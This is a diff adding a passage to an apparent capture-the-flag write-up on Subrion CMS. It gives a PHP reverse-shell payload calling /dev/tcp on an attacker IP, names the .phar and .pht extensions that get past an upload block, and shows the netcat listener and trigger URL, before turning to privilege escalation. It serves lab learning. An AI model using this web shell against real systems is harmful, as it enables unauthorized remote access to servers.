@@ -118,3 +118,56 @@ The second way would be to upload a php script from personal files onto the CMS 
 
 This confirmed my deduction regarding .htaccess block and also gave us a way to create the plant the php code into the uploads directory and afterwards successfully launch it.
 
+Here is what we are going to do:
+
+Create a simple php file with the following code, you can use the following:
+
+<?php
+system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'");
+?>
+
+I am going to use my ip plus port 7777 since it is very rarely occupied.
+Name your file something like shell.phar or shell.pht (.phar worked perfectly for me).
+
+![shell.phar file](assets/shell-file.jpg)
+
+After creating the file, go to Content ---> Uploads in Subrion Panel. You should get a page which looks like this:
+
+![Subrion Uploads](assets/subrion-uploads.png)
+
+On the top panel, there is a button 'Upload files' or just drag-and-drop the reverse shell you have just created:
+
+![Shell Uploaded](assets/shell-uploaded.png)
+
+Nice! Now, before launching the shell, lets create a session on our end that awaits incoming connections. We can accomplish that with the following netcat command:
+
+```bash
+nc -nlvp 7777
+```
+
+The last parameter is the port number that you have used when creating the reverse shell, as I have previously stated, I chose 7777.
+
+![NetCat Listen](assets/netcat-listen.png)
+
+Now that our devices is awaiting a connection attempt, lets launch the reverse shell we have planted:
+
+Go to the directory /subrion/uploads/NAME_OF_THE_SHELL in the browser. For example, the link I will use to start the reverse shell is:
+
+```bash
+http://10.201.31.100/subrion/uploads/shell.phar
+```
+
+![Shell URL](assets/shell-url.png)
+
+And this is the result we get on our device:
+
+![Connection Established](assets/nc-connection.png)
+
+We have successfully deployed a reverse shell, now we need to perform an LPE (Local Privilege Escalation) to gain access to root.txt.
+
+
+Lets look at what we have on the server:
+
+![Listing Server](assets/listing-server.png)
+
+
